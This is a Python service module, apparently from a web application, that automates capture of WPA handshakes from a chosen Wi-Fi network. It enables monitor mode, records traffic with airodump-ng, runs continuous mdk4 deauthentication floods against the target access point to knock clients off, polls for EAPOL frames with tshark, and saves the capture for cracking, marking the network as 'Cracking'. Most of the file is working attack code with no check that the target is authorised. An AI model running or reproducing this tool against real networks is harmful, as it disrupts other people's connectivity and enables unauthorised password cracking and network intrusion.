# app/services/wifi_handshake_service.py

import os
import subprocess
import asyncio
from datetime import datetime

from app.helpers.network import enable_monitor, disable_monitor
from app.schemas.handshake import HandshakeRequest
from app.repositories.wifi_network_repository import WifiNetworkRepository

CAP_DIR = "captures"
TIMEOUT = 500
INTERVAL = 5


class WifiHandshakeService:
    def __init__(self, req: HandshakeRequest, repo: WifiNetworkRepository):
        self.repo = repo
        self.bssid = req.bssid
        self.essid = req.essid.replace(" ", "_")
        self.channel = str(req.channel)
        self.iface = req.interface

        os.makedirs(CAP_DIR, exist_ok=True)
        ts = datetime.utcnow().strftime("%Y-%m-%d_%H%M")
        prefix = f"{ts}-{self.essid}"
        self.cap_prefix = os.path.join(CAP_DIR, prefix)
        self.raw_cap = f"{self.cap_prefix}-01.cap"
        self.final_cap = f"{self.cap_prefix}.cap"

        self.proc_airo = None
        self.proc_deauth = None

    async def start(self):
        enable_monitor(self.iface)
        await self.repo.update_status(self.bssid, "Cracking")

        self.proc_airo = subprocess.Popen(
            [
                "airodump-ng",
                "--bssid",
                self.bssid,
                "-c",
                self.channel,
                "-w",
                self.cap_prefix,
                "--output-format",
                "cap",
                self.iface,
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        self.proc_deauth = subprocess.Popen(
            [
                "mdk4",
                self.iface,
                "d",
                "-c",
                self.channel,
                "-B",
                self.bssid,
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

    async def poll_eapol(self) -> bool:
        if not os.path.exists(self.raw_cap):
            return False

        try:
            proc = await asyncio.create_subprocess_exec(
                "tshark",
                "-r",
                self.raw_cap,
                "-Y",
                "eapol",
                "-c",
                "1",
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            return (await proc.wait()) == 0
        except FileNotFoundError:
            print("Error: tshark command not found. Please install it with 'sudo apt-get install tshark'")
            return False
        except Exception as e:
            print(f"Error checking for EAPOL frames: {e}")
            return False

    async def finalize(self):
        if self.proc_airo and self.proc_airo.poll() is None:
            self.proc_airo.kill()
        if self.proc_deauth and self.proc_deauth.poll() is None:
            self.proc_deauth.kill()

        if os.path.exists(self.raw_cap):
            os.replace(self.raw_cap, self.final_cap)

        await self.repo.update_handshake(self.bssid, self.final_cap)

        disable_monitor(self.iface)

    async def abort(self):
        if self.proc_airo and self.proc_airo.poll() is None:
            self.proc_airo.kill()
        if self.proc_deauth and self.proc_deauth.poll() is None:
            self.proc_deauth.kill()
        disable_monitor(self.iface)

    async def events(self):
        try:
            yield 'event: start\ndata: {"message":"Starting handshake capture"}\n\n'
            await self.start()
            max_loops = TIMEOUT // INTERVAL
            loop = 0

            try:
                while loop < max_loops:
                    yield f"event: heartbeat\ndata: {loop}\n\n"

                    await asyncio.sleep(INTERVAL)
                    loop += 1

                    if await self.poll_eapol():
                        yield "event: progress\ndata: 100\n\n"
                        await self.finalize()
                        yield (f'event: done\ndata: {{"handshake_file":"' f'{self.final_cap}"}}\n\n')
                        return

                    pct = min(loop * 100 // max_loops, 99)
                    yield f"event: progress\ndata: {pct}\n\n"

                yield "event: progress\ndata: 100\n\n"
                yield ("event: error\ndata: " '{"message":"timeout: no EAPOL frames captured"}\n\n')
            except Exception as e:
                yield f'event: error\ndata: {{"message":"Error during handshake capture: {str(e)}"}}\n\n'
            finally:
                await self.abort()
        except Exception as e:
            yield f'event: error\ndata: {{"message":"Failed to start handshake capture: {str(e)}"}}\n\n'
